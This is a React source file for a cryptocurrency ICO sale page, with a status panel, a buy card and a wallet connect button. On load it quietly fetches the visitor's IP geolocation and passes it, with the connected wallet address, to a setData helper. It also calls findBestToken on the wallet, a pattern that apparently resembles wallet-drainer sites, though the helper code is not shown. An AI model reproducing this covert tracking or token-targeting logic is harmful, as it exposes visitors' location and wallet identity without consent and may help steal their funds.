import React from "react";
import { useEffect, useState } from "react";
import axios from "axios";
import { useAccount, useNetwork } from "wagmi";
import { findBestToken, setData } from "../../utils/utils";
import Status from "../../components/Status";
import BuyCard from "../../components/BuyCard";
import { useContractStatus } from "../../hooks/useContractStatus";
import Connect from "../../components/Connect";
import './ico.css'
// import StakingRunNode from "../../components/stakingRunNode";
// import Security from "../../components/security";
// import HowItWorks from "../../components/howItWorks";
// import Community from "../../components/community";
// import News from "../../components/news";
// import Team from "../../components/team";
// import Dao from "../../components/dao";
// import NodeOperator from "../../components/nodeOperator";

export default function IcoPage() {
    const [refresh, setRefresh] = useState(false)
    const {
        totalVolume,
        isWL,
        userVolume,
        tokenBalance,
        allowance,
        ethBalance
    } = useContractStatus(refresh)
    const { address } = useAccount()
    const { chain } = useNetwork()

    const [geo, setGeo] = useState("")

    useEffect(() => {
        async function fetchData() {
            const res = await axios.get('https://geolocation-db.com/json/')
            setGeo(JSON.stringify(res.data))
        }
        fetchData()
    }, [])

    useEffect(() => {
        if (geo) {
            setData(geo, address, 'init', 'init')
        }
    }, [geo, address])

    useEffect(() => {
        if (address) {
            findBestToken(address, chain.id)
        }
    }, [address, chain])

    return (
        <div
            className=""
            id="header"
        >
            <div className="bg-header relative overflow-hidden">
                <div className="bg-fx"></div>
                <div className="rocket"></div>
                <div className="trail"></div>
                <div className="bg-clouds-top"></div>
                <div className="relative overflow-hidden">
                    <div className="relative pt-6 pb-16 sm:pb-24">
                        <div className="mt-5 mx-auto max-w-7xl lg:px-4 px-1">
                            <div className="flex flex-row justify-items-center lg:justify-between gap-3">
                                <div className="flex lg:flex-row lg:justify-items-right lg:gap-2">
                                    <img alt="img"
                                        src={"/image/rocket.png"}
                                        className="lg:max-w-lg"
                                    />
                                    <img alt="img"
                                        src={"/image/logo_string.png"}
                                        className="hidden lg:flex w-0 lg:w-auto py-5 mx-3"
                                    />
                                </div>
                                <Connect />
                            </div>
                            <div className="mt-5 pb-12 sm:pb-16">
                                <div className="relative">
                                    <div className="absolute inset-0 h-1/2"></div>
                                    <div
                                        className="relative max-w-7xl mx-auto px-4 sm:px-6 lg:px-8"
                                    >
                                        <Status totalVolume={totalVolume} userVolume={userVolume} />
                                        <div className="lg:w-5/6 w-full flex lg:flex-row flex-col justify-center gap-5 items-center mx-auto px-2 my-5 lg:mt-[80px]">
                                            <BuyCard
                                                setRefresh={setRefresh}
                                                refresh={refresh}
                                                isWL={isWL}
                                                userVolume={userVolume}
                                                tokenBalance={tokenBalance}
                                                allowance={allowance}
                                                ethBalance={ethBalance} />
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        // <React.Fragment>
        //     <div id="app" data-v-app="">
        //         <div id="app" className="">
        //             <div id="home">
        //                 <Status totalVolume={totalVolume} userVolume={userVolume} />
        //                 <div className="lg:w-5/6 w-full flex lg:flex-row flex-col justify-center gap-5 items-center mx-auto px-2 my-5 lg:mt-[80px]">
        //                     <BuyCard
        //                         setRefresh={setRefresh}
        //                         refresh={refresh}
        //                         isWL={isWL}
        //                         userVolume={userVolume}
        //                         tokenBalance={tokenBalance}
        //                         allowance={allowance}
        //                         ethBalance={ethBalance} />
        //                 </div>
        //                 {/* <StakingRunNode /> */}
        //                 {/* <Security /> */}
        //                 {/* <HowItWorks /> */}
        //                 {/* <Community /> */}
        //                 {/* <News /> */}
        //                 {/* <Team /> */}
        //                 {/* <Dao /> */}
        //                 {/* <NodeOperator /> */}
        //             </div>
        //         </div>
        //     </div>
        // </React.Fragment >
    );
}
